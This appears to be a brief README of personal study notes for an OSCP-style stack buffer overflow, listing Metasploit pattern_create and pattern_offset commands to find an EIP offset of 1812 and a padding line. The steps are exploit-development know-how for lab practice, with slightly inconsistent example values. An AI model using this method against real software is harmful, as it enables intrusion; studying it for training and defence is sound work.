# OSC_BoF
This Rep describes my steps for BoF. 

1. File is Bad_Char python. 

2. To find the EIP offset net to create a pattern with msfvenom 

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 > exploit.txt
-> check the EIP value: example EIP: 43346943
then use command to find out the offset: 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q 42367242
offset = 1812, -> need to fill until then with 1812 Chars
 #buf = b"A" * OFFSET #junk get to EIP
